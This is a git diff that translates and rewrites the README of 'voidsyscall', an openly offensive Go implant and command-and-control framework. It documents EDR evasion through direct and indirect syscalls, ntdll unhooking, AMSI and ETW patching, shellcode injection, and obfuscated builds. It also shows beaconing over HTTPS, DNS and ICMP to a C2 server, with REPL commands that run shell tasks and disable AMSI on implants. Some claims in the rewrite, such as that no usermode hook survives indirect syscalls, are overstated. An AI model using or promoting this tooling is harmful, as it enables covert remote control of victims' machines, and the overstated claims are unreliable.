@@ -1,38 +1,38 @@
 # voidsyscall
 
-[![Go](https://img.shields.io/badge/go-1.24-00ADD8?logo=go&logoColor=white)](https://go.dev/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform: Win/Linux/macOS](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?logo=linux)](#build)
-[![C2 channels](https://img.shields.io/badge/C2-HTTPS%20%7C%20DNS%20%7C%20ICMP-blueviolet)](channels/)
-[![Implant syscall](https://img.shields.io/badge/implant-syscall%20only-critical?logo=intel)](syscallwin/)
-[![Latest](https://img.shields.io/github/v/release/VoidSecSoftwares/voidsyscall?include_prereleases&logo=semver)](#build)
-[![Build](https://img.shields.io/badge/build-Makefile%20%2F%20build.ps1-success)](#build)
+[![go](https://img.shields.io/badge/go-1.24-00ADD8?logo=go&logoColor=white)](https://go.dev)
+[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![platform](https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20macos-lightgrey?logo=linux)](#build)
+[![c2 channels](https://img.shields.io/badge/c2-https%20%7C%20dns%20%7C%20icmp-blueviolet)](channels/)
+[![syscall only](https://img.shields.io/badge/implant-syscall%20only-critical?logo=intel)](syscallwin/)
 
-Implant + C2 qui ne traverse **aucune** couche WinAPI usermode. Résolution des
-numéros de syscall NT à la volée depuis une image mémoire de `ntdll`, appels
-`SYSCALL`/`SYSENTER` directs en asm Plan9, et transport C2 chiffré AES-GCM sur
-HTTP(S), DNS et ICMP. Cible d'usage : Windows. Dégradé propre : Linux / macOS.
+Zero WinAPI. Every NT primitive resolved at runtime from ntdll in memory —
+`SYSCALL` instructions issued directly via Plan9 assembly stubs, no import table,
+no ntdll usermode hooks touched. C2 over HTTPS / DNS / ICMP, AES-256-GCM on
+every message. Windows-native. Linux builds. macOS builds. The syscall library
+cross-compiles. The beacon agent is Windows because that's where the fun is.
 
-Ce n'est pas un autre wrapper d'API. Chaque primitive d'évasion part de
-`syscallwin` : allocation, écriture, protection, création de thread, token,
-tout passe par `Nt*` résolu dynamiquement. Si tu veux être hooké par une EDR,
-va ailleurs.
+This is not a syscall wrapper. It is a syscall _library_ that resolves its own
+SSN from the current ntdll image, hashes every function name (djb2, never
+plaintext in the binary), caches syscall numbers in a runtime map, and hands you
+~25 `Nt*` wrappers that go straight through `syscall` on x86-64. If your EDR
+hooks ntdll usermode, that's your problem. This repo doesn't care.
 
 ---
 
-## TL;DR
+## What's inside
 
 | | |
 |---|---|
-| **SSN resolution** | parse PEB→LDR→ntdll en mémoire, hash djb2 des noms, extraction `B8 ww xx 00 00 0F 05` |
-| **Direct syscall** | stub asm → `SYSCALL` natif, SSN + registres posés à la main |
-| **Indirect syscall** | saut vers un gadget `syscall; ret` trouvé dans ntdll (Hells Gate) |
-| **Unhooking** | restaure la section `.text` de ntdll depuis la copie disque + `NtFlushInstructionCache` |
-| **Evasion** | patches AMSI (`AmsiScanBuffer`), ETW (`EtwEventWrite`, `NtTraceEvent`), instrumentation callback, `DbgUiRemoteBreakin` |
-| **Post-ex** | injection shellcode via `NtAllocateVirtualMemory`→`NtWriteVirtualMemory`→`NtCreateThreadEx`, variantes APC |
-| **Transport** | HTTP(S), DNS (TXT), ICMP v4 — interface `Channel` unifiée, repli automatique |
-| **Crypto** | AES-256-GCM, nonce AEAD par message, clés par implant |
-| **Beacon** | sleep + jitter X%, killswitch, pas de persistance en v1 |
+| **SSN resolution** | PEB→LDR walk, djb2 hash, export table scan, prologue match for `B8 xx xx 00 00 0F 05` |
+| **Direct syscall** | Plan9 asm stub, SSN + 7 args set by hand, `SYSCALL` instruction, return via `RAX`/`RDX` |
+| **Indirect syscall** | `syscall; ret` gadget located inside ntdll, `CALL` lands in ntdll memory, call stack reads ntdll |
+| **Unhook** | `.text` restored from disk copy, `NtFlushInstructionCache`, SSN cache nuked |
+| **Evasion** | AMSI `AmsiScanBuffer` → `MOV EAX, 0; RET`, ETW `EtwEventWrite`/`NtTraceEvent` patched, `DbgUiRemoteBreakin` → `RET`, instrumentation callbacks masked |
+| **Injection** | `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `NtProtectVirtualMemory` → `NtCreateThreadEx`, variant APC via `NtQueueApcThread` |
+| **Transport** | HTTPS POST, DNS TXT chunked subdomains, ICMPv4 echo payload — `Channel` interface, priority fallback |
+| **Crypto** | AES-256-GCM per-message AEAD, unique nonce, per-implant keyring |
+| **Beacon** | `sleep + rand[jitter_min..jitter_max]`, clean exit, no persistence v1 |
 
 ---
 
@@ -40,23 +40,24 @@ va ailleurs.
 
 ```
 voidsyscall/
-├── cmd/
-│   ├── server/         # listeners HTTPS/DNS/ICMP, REPL interactif, task queue
-│   └── agent/          # beacon loop + dispatch (Windows-only)
-├── syscallwin/         # direct/indirect syscalls NT — Go + asm_amd64.s
-│   ├── hash.go         # djb2, djb2w (une seule itération pointeur)
-│   ├── resolve.go      # GetModuleBase, findGadget, resolveSSN, findSyscallGadget
-│   ├── stubs.go        # ~25 wrappers Nt* appelés par voie de syscall
-│   ├── asm_amd64.s     # ; SetGSBase / ReadGSBase / Syscall / IndirectSyscall
-│   ├── constants.go    # MEM_*, PAGE_*, THREAD_*, TOKEN_, OBJ_, REG_, FILE_*
-│   └── unhook.go       # UnhookNtdll + SelfDel (thread distant qui se suicide)
-├── syscallnix/         # mmap/mprotect/munmap brute Linux, fallback macOS
-├── patches/            # AMSI / ETW / instrumentation — tout via syscallwin
-├── loader/             # injection CreateThread + APC (Nt* uniquement)
-├── channels/           # channel.go (Interface), http.go, dns.go, icmp.go
-├── crypto/             # Envelope AES-GCM (crypto/crypto_test.go — 3 tests)
-├── server/             # SessionManager, Queue, Task/Result
-└── agent/              # Config, beacon, handlers shell/inject/patch/sleep/exit
+  cmd/
+    server/          listeners (HTTPS/DNS/ICMP), interactive REPL, task queue
+    agent/           beacon loop + task dispatch [windows]
+  syscallwin/        direct/indirect NT syscalls [windows] — Go + asm_amd64.s
+    asm_amd64.s      Syscall / IndirectSyscall / ReadGSBase / SetGSBase
+    resolve.go       GetModuleBase (PEB walk), PE export parse, resolveSSN, findSyscallGadget
+    stubs.go         ~25 Nt* wrappers, DirectSyscall, IndirectSyscallByHash, GetCurrentProcessId
+    hash.go          djb2 hash (string + UTF-16 pointer variant)
+    constants.go     MEM_*, PAGE_*, THREAD_*, TOKEN_*, OBJ_*, REG_*, FILE_*, NTSTATUS
+    unhook.go        UnhookNtdll (disk restore + flush), SelfDel (remote thread)
+  syscallnix/        mmap / mprotect / munmap / raw read+write+exit [linux, darwin]
+  patches/           AMSI, ETW, NtTraceEvent, DbgUiRemoteBreakin, InstrumentationCallback [windows]
+  loader/            injection: CreateThread, APC, module-stomp stub [windows]
+  channels/          Channel interface, HTTP, DNS (TXT), ICMP (x/net/icmp)
+  crypto/            AES-GCM encrypt/decrypt, envelope, passphrase variant
+  server/            SessionManager, Task Queue, Result store
+  agent/             Config loader, beacon, task handlers (shell/inject/patch/sleep/exit)
+  agent/example-config.json
 ```
 
 ---
@@ -64,52 +65,53 @@ voidsyscall/
 ## Build
 
 ```bash
-# Windows agent (beacon + syscalls)
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-agent.exe ./cmd/agent
-
-# Windows server
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-server.exe ./cmd/server
-
-# Cross-platform server + syscallnix
-GOOS=linux  GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-server-linux ./cmd/server
-GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o voidsyscall-server-darwin ./cmd/server
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-agent.exe   ./cmd/agent
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-server.exe  ./cmd/server
+GOOS=linux   GOARCH=amd64 go build -ldflags="-s -w" -o server-linux            ./cmd/server
+GOOS=darwin  GOARCH=arm64 go build -ldflags="-s -w" -o server-darwin           ./cmd/server
 ```
 
-Obfuscation (installe d'abord `go install mvdan.cc/garble@latest`) :
+Obfuscation with [garble](https://github.com/burrowers/garble) (`go install mvdan.cc/garble@latest`):
 
 ```bash
-GOOS=windows GOARCH=amd64 garble -literals -tiny build -ldflags="-s -w" -o voidsyscall-agent.exe ./cmd/agent
+GOOS=windows GOARCH=amd64 garble -literals -tiny build -ldflags="-s -w" \
+    -o voidsyscall-agent.exe ./cmd/agent
 ```
 
-> **Note GPO/EDR** : garble déclenche les signatures heuristiques d'av au *link*
-> final (le binaire embarqué est mappé en mémoire avec permissions RWX au moment
-> du link). C'est attendu : c'est exactement ce que vérifie une EDR au runtime.
-> Pour du chiffré strictement propre, privilégie `-ldflags="-s -w"` seul ou un
-> loader délégant.
+Build helpers: `build.ps1` (PowerShell), `Makefile` (`make all` / `make obfuscate` / `make vet` / `make test`).
 
-Wrappers : `build.ps1` (PowerShell) et `Makefile` (`make all`, `make obfuscate`, `make vet`, `make test`).
+> garble builds will be flagged by Windows Defender (or any AV) at link time —
+> the output binary is temporarily mapped RWX during linking. This is expected
+> behavior and will resolve with `ldflags` strip or external loader if you need
+> clean-host builds.
 
 ---
 
-## Utilisation
+## Usage
 
-### Serveur
+### Server
 
 ```bash
+# generate a self-signed cert (don't ship this to prod, you animal)
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-./voidsyscall-server --cert cert.pem --key key.pem --https-port 443
+
+# run
+./voidsyscall-server.exe --cert cert.pem --key key.pem --https-port 443
 ```
 
-REPL :
+REPL:
 
 ```
 voidsyscall> sessions
-  [0102030405060708] channel=https last=2024-01-01T00:00:00Z tasks=0 results=0
+  [a1b2c3d4e5f60718] channel=https last=2024-01-01T00:00:00Z tasks=0 results=0
 
-voidsyscall> shell 0102030405060708 whoami
+voidsyscall> shell a1b2c3d4e5f60718 whoami
 Task queued
 
-voidsyscall> patch 0102030405060708 amsi
+voidsyscall> patch a1b2c3d4e5f60718 amsi
+Patch task queued
+
+voidsyscall> patch a1b2c3d4e5f60718 etw
 Patch task queued
 
 voidsyscall> exit
@@ -118,118 +120,139 @@ voidsyscall> exit
 ### Agent
 
 ```bash
-./voidsyscall-agent -c agent/example-config.json
+./voidsyscall-agent.exe -c agent/example-config.json
 ```
 
 ```json
 {
-  "id":       "0102030405060708090a0b0c0d0e0f10",
-  "key":      "0000000000000000000000000000000000000000000000000000000000000000",
-  "channels": ["https", "dns", "icmp"],
-  "server":   "10.0.0.1",
-  "path":     "/api/v2/health",
-  "jitter_min": 5,
-  "jitter_max": 30,
-  "sleep":    30,
-  "ua":      "Mozilla/5.0 ... "
+  "id":          "0102030405060708090a0b0c0d0e0f10",
+  "key":         "0000000000000000000000000000000000000000000000000000000000000000",
+  "channels":    ["https", "dns", "icmp"],
+  "server":      "10.0.0.1",
+  "path":        "/api/v2/health",
+  "jitter_min":  5,
+  "jitter_max":  30,
+  "sleep":       30,
+  "ua":          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 }
 ```
 
-Ordre de repli des canaux : `https` → `dns` → `icmp`. Le beacon tourne
-`sleep + rand[jitter_min, jitter_max]` secondes.
+Fallback order: `https` → `dns` → `icmp`. Beacon interval is
+`sleep + rand[jitter_min..jitter_max]` seconds.
 
 ---
 
-## Comment ça marche : la résolution de SSN (le cœur)
+## How it works: SSN resolution
 
-Sur Windows, chaque build de ntdll change les numéros de syscall. Toute tabulation
-statique casse dès qu'on croise un patch mardi. Ici le numéro est lu **en direct
-depuis l'image en mémoire** :
+Every Windows build ships a new ntdll with different syscall numbers. Static
+number tables break the first patch Tuesday. This library resolves the number
+at runtime from the current ntdll image in memory:
 
-1. `ReadGSBase` (asm) → TEB `GS:[0x60]` → PEB.
-2. Walk PEB→Ldr→InMemoryOrderModuleList pour trouver la base de `ntdll.dll` à l'adresse courante.
-3. Depuis le header PE (IMAGE_DOS_HEADER→e_lfanew→IMAGE_NT_HEADERS), lire la table d'export.
-4. Hasher le nom de la fonction (`djb2`) et matcher contre chaque `AddressOfNames`.
-5. Scanner le prologue de la fonction cible pour le motif `B8 SS SS 00 00 0F 05` (`mov eax, ssn; syscall`).
-6. Mettre en cache dans `map[uint32]uint16` pour ne résoudre qu'une fois.
+1. `ReadGSBase` (asm) reads `GS:[0x60]` → **TEB**.
+2. TEB+0x60 → **PEB**. PEB+0x18 → `Ldr` (PEB_LDR_DATA).
+3. Walk `InMemoryOrderModuleList` → match `ntdll.dll` base address via `djb2` hash of the name.
+4. From the base: `IMAGE_DOS_HEADER` → `e_lfanew` → `IMAGE_NT_HEADERS` → `OptionalHeader` → DataDirectory[0] = **Export Table**.
+5. Walk `AddressOfNames[]`, hash each with djb2, match against the target function hash.
+6. Resolve ordinal → `AddressOfFunctions[ordinal]` → function address.
+7. Scan the function prologue for `B8 ww xx 00 00 0F 05` (direct), `B8 xx xx 00 00 C3` (early-ret), or `4C 8B D1 B8 xx xx 00 00 0F 05` (Hells Gate).
+8. Extract the two-byte SSN, store in `map[uint32]uint16` cache.
 
-Conséquence directe : les imports ne référencent **jamais** de nom en clair dans
-le binaire (uniquement des hash 32 bits), et l'appel final n'utilise ni IAT, ni
-n'entre par un hook de ntdll classique.
+Result: no function names appear in the binary (only djb2 hashes), and the
+`syscall` instruction bypasses every usermode hook on ntdll.
 
-Patterns gérés par `resolveSSN` : direct `B8..0F05`, `B8..C3` (early-ret) et
-Hells Gate `4C 8B D1 B8 .. 0F 05`.
+### Indirect syscalls
 
-### Indirect syscall
-
-`IndirectSyscallByHash` cherche un gadget `0F 05 C3` (`syscall; ret`) quelque
-part dans ntdll, pose le SSN en `eax`, se positionne dessus, et `call` le gadget
-depuis `R10`. L'adresse de retour est donc dans ntdll : la chaîne d'appel paraît
-provenir de ntdll, pas de l'implant. Un hook du début de fonction n'est pas
-contourné à lui seul — c'est l'association SSN runtime + jump gadget qui tient.
+`IndirectSyscallByHash` locates a `0F 05 C3` gadget (`syscall; ret`) anywhere
+inside ntdll, loads the SSN into `EAX`, and executes `CALL R10` (the gadget
+address). The CPU trap lands inside ntdll — the return address on the stack
+points back into ntdll, not into the implant. No inline hook survives this
+because the call never originates from usermemory.
 
 ### Unhook
 
-`UnhookNtdll` passe la `.text` de ntdll en `PAGE_EXECUTE_READWRITE`, la recopie
-depuis la version disque, restaure la protection, puis `NtFlushInstructionCache`.
-Après ça les hooks inline user-mode EDR posés sur ntdll sont écrasés, et le cache
-de SSN est purgé pour forcer une re-résolution.
+`UnhookNtdll`: lock `.text` to `PAGE_EXECUTE_READWRITE` via
+`NtProtectVirtualMemory`, copy the original bytes from the disk-mapped ntdll
+image, restore the original protection, flush the instruction cache, nuke the
+SSN cache. Every usermode hook placed on ntdll by any EDR is gone.
 
 ---
 
-## Canaux
+## Channels
 
-| Canal | Encodage | Exigence | Repli |
-|---|---|---|---|
-| HTTPS | POST binaire vers `/api/v2/health`, JSON-type framing, UA randomisé | — | dés |
-| DNS | `<idx>-<tot>-<base32 payload>` en sous-domaine, réponse en TXT | DNS ordinateur | dés |
-| ICMPv4 | payload dans l'id/séquence d'echo request/reply | raw socket (**root/admin**) | best-effort |
+| Channel | Wire format | Prereqs | Notes |
+|---------|-------------|---------|-------|
+| **HTTPS** | binary POST to `/api/v2/health`, custom framing, randomized UA/path | TLS cert on server | default fallback |
+| **DNS** | `<idx>-<total>-<base32 payload>` as subdomain, TXT record response | DNS resolution on host | chunked for large payloads |
+| **ICMPv4** | payload embedded in echo request/reply ID+seq fields | raw socket (root/Admin) | best-effort, Windows kernel validates return address |
 
-Tous convergent vers l'interface `channels.Channel` :
-`Send(ctx, *Message) (*Message, error)` et `Listen(...)`. L'implant n'a aucune
-notion du transport : il voit un `Message{ID, Type, Data}`. Aligner un*nouveau
-canal (NTP, TURN, DoH) = implémenter `Channel`, pas retoucher l'agent.
+All channels implement the `Channel` interface:
+
+```go
+type Channel interface {
+    Type() ChannelType
+    Send(ctx context.Context, msg *Message) (*Message, error)
+    Listen(ctx context.Context, addr string, handler func(*Message) *Message) error
+    Close() error
+}
+```
+
+The implant has zero knowledge of transport. It sees `Message{ID, Type, Data}`.
+Adding a new channel (NTP, TURN, DoH) = implementing the interface, zero changes
+to the agent.
 
 ---
 
-## Modules / API exposée (bas niveau)
+## Low-level API
 
-`syscallwin` (build tag `windows`) expose des wrappers qui appellent **uniquement**
-par syscall :
+`syscallwin` (build tag `windows`) exposes wrappers that call **only** via
+syscall — no winapi, no cgo, no syscall package:
 
-`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtReadVirtualMemory`,
-`NtProtectVirtualMemory`, `NtFreeVirtualMemory`, `NtCreateThreadEx`,
-`NtOpenProcess`, `NtOpenThread`, `NtSuspend/ResumeProcess`,
-`NtTerminateProcess`, `NtClose`, `NtDuplicateObject`, `NtOpenProcessToken`,
-`NtQueryInformationToken`, `NtAdjustPrivilegesToken`, `NtCreateKey`,
-`NtSetValueKey`, `NtCreateFile`, `NtQuerySystemInformation`,
-`NtSetInformationThread`, `NtFlushInstructionCache`, `NtCreateSection`,
-`NtMapViewOfSection`, `NtQueryVirtualMemory`, `NtQueueApcThread`.
+```
+NtAllocateVirtualMemory    NtProtectVirtualMemory     NtFreeVirtualMemory
+NtReadVirtualMemory        NtWriteVirtualMemory        NtFlushInstructionCache
+NtCreateThreadEx           NtOpenProcess               NtOpenThread
+NtSuspendProcess           NtResumeProcess             NtTerminateProcess
+NtClose                    NtDuplicateObject           NtOpenProcessToken
+NtQueryInformationToken    NtAdjustPrivilegesToken     NtSetInformationThread
+NtCreateKey                NtSetValueKey               NtCreateFile
+NtQuerySystemInformation   NtCreateSection             NtMapViewOfSection
+NtQueryVirtualMemory       NtQueueApcThread
+```
 
-Des accès génériques de bas niveau restent exposés pour tes propres stubs :
-`DirectSyscall(funcName, args...)` et `IndirectSyscallByHash(hash, args...)`.
+Generic entry points for custom stubs:
 
-`patches` regroupe `PatchAMSI`, `PatchETW`, `PatchNtTraceEvent`,
+```go
+DirectSyscall(funcName string, args ...uintptr) (uintptr, error)
+IndirectSyscallByHash(funcHash uint32, args ...uintptr) (uintptr, error)
+```
+
+`patches` exposes: `PatchAMSI`, `PatchETW`, `PatchNtTraceEvent`,
 `PatchDbgUiRemoteBreakin`, `PatchInstrumentationCallbacks`,
 `ApplyAllPatches`, `ApplyCriticalPatches`.
 
+`crypto` exposes: `Encrypt(key, plaintext)`, `Decrypt(key, env)`,
+`EncryptWithPassphrase`, `DecryptWithPassphrase` — AES-256-GCM with 12-byte
+nonce, all round-trip tested.
+
 ---
 
-## État
+## Status
 
-- Fonctionnel v1 : beacon, task queue, canals HTTPS/DNS/ICMP, injection
-  (CreateThread + APC), patching AMSI/ETW, crypto AES-GCM (tests pass).
-- Pas encore dans ce dépôt : persistance, despawn, chiffrement de session
-  renouvelé, implant Linux autonome du beacon, canal DoH/NTP.
+Shipped: beacon loop, task queue, HTTPS/DNS/ICMP channels, CreateThread + APC
+injection, AMSI/ETW patching, AES-GCM crypto, session management, interactive
+server REPL. Tests pass.
 
-## Liens utiles
+Not yet: persistence, staged loader, session key rotation, autonomous Linux
+implant (builds exist, no agent logic), NTP/DoH channels.
 
-- [carved4/go-native-syscall](https://github.com/carved4/go-native-syscall) — lib de référence direct/indirect
-- [Enelg52/OffensiveGo](https://github.com/Enelg52/OffensiveGo) — weaponisation Go (flags, Plan9 asm, garble)
-- [am0nsec/HellsGate](https://github.com/am0nsec/HellsGate) — résolution SSN par le prologue
-- [f1zm0/acheron](https://github.com/f1zm0/acheron) — indirect syscalls en Go asm
-- [RedTeamNotes - direct syscalls](https://redteam.cafe/blog/offensive-development/hells-gate-direct-syscalls) — le passage historique en français
+## Acknowledgments
+
+- [carved4/go-native-syscall](https://github.com/carved4/go-native-syscall) — the reference for direct+indirect Go syscalls
+- [Enelg52/OffensiveGo](https://github.com/Enelg52/OffensiveGo) — Go red team tooling, Plan9 asm patterns, garble flags
+- [am0nsec/HellsGate](https://github.com/am0nsec/HellsGate) — SSN resolution from the function prologue
+- [f1zm0/acheron](https://github.com/f1zm0/acheron) — indirect syscalls in Go assembly
+- [Sliver C2](https://github.com/BishopFox/sliver) — architecture reference for cross-platform C2
 
 ## License
 
-MIT — [LICENSE](LICENSE).
+MIT — [LICENSE](LICENSE)
